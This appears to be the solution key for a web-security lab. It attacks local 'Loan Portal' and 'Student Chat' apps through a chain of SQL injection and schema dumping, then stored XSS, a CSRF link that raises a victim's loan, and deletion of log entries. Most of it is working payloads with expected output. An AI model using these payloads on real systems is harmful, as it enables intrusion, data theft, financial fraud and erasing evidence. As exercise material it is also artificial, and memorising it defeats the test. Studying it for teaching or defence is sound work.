# Solution A2

## 1. Confirm SQL injection

In the Loan Portal login form, submit:

- Username: `meherun.nesa' -- -`
- Password: anything

The trailing `-- -` comments out the `AND password = '...'` clause entirely, so the
login succeeds without the password ever being checked. This confirms that the login
query is built by unsafely concatenating both fields.

## 2. Find the column count

Keep the password field empty/irrelevant and probe the username field:

```sql
meherun.nesa' ORDER BY 6 -- -
meherun.nesa' ORDER BY 7 -- -
```

`ORDER BY 6` succeeds, `ORDER BY 7` fails with an unknown-column error. The `loan` table
therefore has six columns (`student_id, first_name, last_name, username, password,
loan_amount`).

## 3. Discover tables and columns

```sql
x' UNION SELECT 1,'',GROUP_CONCAT(table_name),'x','x',0 FROM information_schema.tables WHERE table_schema=DATABASE() -- -
```

Expected relevant output (rendered in the unescaped `last_name` position):

```text
loan,log
```

Column discovery:

```sql
x' UNION SELECT 1,'',GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ', '),'x','x',0 FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='loan' -- -
```

```sql
x' UNION SELECT 1,'',GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ', '),'x','x',0 FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='log' -- -
```

Expected column sets:

```text
loan: student_id, first_name, last_name, username, password, loan_amount
log: id, submitted_username, submitted_password, attempted_at
```

## 4. Extract every student's loan amount

Because `username='x'` matches no real row, the `UNION` result becomes the only row
returned, and it is rendered directly in the (unescaped) name position:

```sql
x' UNION SELECT 1,'',GROUP_CONCAT(student_id,' ',first_name,' ',last_name,':',loan_amount ORDER BY student_id SEPARATOR '<br>'),'x','x',0 FROM loan -- -
```

Submit this as the **username** field (password field can be anything). The rendered
page lists all fifteen students with their exact current `loan_amount`.

## 5. Persist the stored-XSS payload

First log in to Student Chat as `meherun.nesa` using password `chat-Meherun-99`. Keep
that browser session active.

Then submit the following Loan Portal login:

- Username: `meherun.nesa`
- Password:

```sql
nesa-99'; UPDATE loan SET last_name='<script>fetch("http://localhost:7001/send",{method:"POST",headers:{"content-type":"application/x-www-form-urlencoded"},credentials:"include",body:"body="+encodeURIComponent("Click here to get your reward! <a href=http://localhost:7000/reward>Click here to get your reward!</a>")});</script>' WHERE student_id=9900001; -- -
```

Why this works:

- The first statement still checks the real password (`nesa-99`), so this login request
  itself behaves like a normal, successful login.
- The second, stacked statement updates only the attacker's own `last_name`.
- The Loan Portal renders `last_name` without escaping it, so the stored `<script>` will
  execute the next time this record is rendered.
- The script posts to Student Chat's `/send` endpoint with `credentials: "include"`,
  which rides on the attacker's already-active Student Chat session cookie.
- The chat message body is also rendered without escaping in Student Chat, so the
  embedded `<a href=...>` renders as a real, clickable link rather than plain text.

## 6. Trigger and verify the Loan App to Student Chat compromise

Log in to the Loan Portal again normally:

- Username: `meherun.nesa`
- Password: `nesa-99`

The dashboard renders the stored script, which fires a request to Student Chat. Open
`http://localhost:7001` while still logged in as `meherun.nesa` (Student Chat). A new
message should appear:

```text
Meherun Nesa: Click here to get your reward! Click here to get your reward!
```

with the second occurrence a clickable link to `http://localhost:7000/reward`.

## 7. Reward-link CSRF

Log in to the Loan Portal as the victim (`shafayet.islam` / `islam-99`) in a separate
browser/session, and confirm their starting loan amount is `$3400.50`. Then, while still
logged in to Student Chat as the victim (or simply while the victim's Loan Portal session
cookie is active), click the reward link, or navigate directly to
`http://localhost:7000/reward`.

The `/reward` page's inline script performs:

```js
fetch("/request-loan", {
  method: "POST",
  headers: { "content-type": "application/x-www-form-urlencoded" },
  credentials: "include",
  body: "amount=1000"
});
```

Because `/request-loan` has no CSRF token and identifies the student purely from the
session cookie, this silently increases the victim's own loan amount by `$1000`. Confirm
by reloading the Loan Portal as the victim: the loan amount should now read `$4400.50`.

## Bonus cleanup

Discover the `log` table through the schema steps above. Then submit as the attacker:

- Username: `meherun.nesa`
- Password:

```sql
nesa-99'; DELETE FROM log WHERE submitted_username='meherun.nesa'; -- -
```

This removes only login-attempt evidence attributable to the attacker's own username.
The two pre-seeded rows for `shafayet.islam` and `ashraful.alam`, and any other
students' rows, should remain.
